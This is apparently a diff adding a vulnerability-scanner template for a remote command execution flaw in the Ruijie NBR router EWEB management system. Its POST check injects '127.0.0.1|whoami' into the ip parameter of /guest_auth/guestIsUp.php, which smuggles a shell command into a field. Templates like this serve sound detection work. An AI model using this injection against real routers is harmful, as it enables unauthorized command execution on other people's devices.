@@ -1,0 +1,57 @@
+app: 锐捷nbr路由器
+query: app:"锐捷nbr路由器"
+meta:
+  name: 锐捷NBR路由器 EWEB网管系统 远程命令执行漏洞
+  level: 4
+  tags:
+    - remote_code_execution
+  description: 锐捷NBR路由器 EWEB网管系统部分接口存在命令注入，导致远程命令执行获取权限
+  homepage: http://www.ruijie.com.cn/
+  author: Administrator
+  references: ""
+  solution: ""
+  steps:
+    verify_steps:
+      type: and
+      verify:
+        - request:
+            method: POST
+            path: /guest_auth/guestIsUp.php
+            redirect: false
+            header:
+              - Content-Type: application/x-www-form-urlencoded
+            params: mac=1&ip=127.0.0.1|whoami
+          response:
+            - name: code
+              value: "404"
+              type: not equals
+            - name: body
+              value: File not found.
+              type: not contains
+            - name: body
+              value: '>__<'
+              type: not contains
+            - name: code
+              value: "200"
+              type: equals
+        - request:
+            method: GET
+            path: /guest_auth/guestIsUp.php
+            redirect: false
+            header:
+              - Content-Type: application/x-www-form-urlencoded
+            params: ""
+          response:
+            - name: code
+              value: "404"
+              type: not equals
+            - name: body
+              value: File not found.
+              type: not contains
+            - name: body
+              value: '>__<'
+              type: not contains
+            - name: code
+              value: "200"
+              type: equals
+  create_at: "2022-05-23 16:59:52"
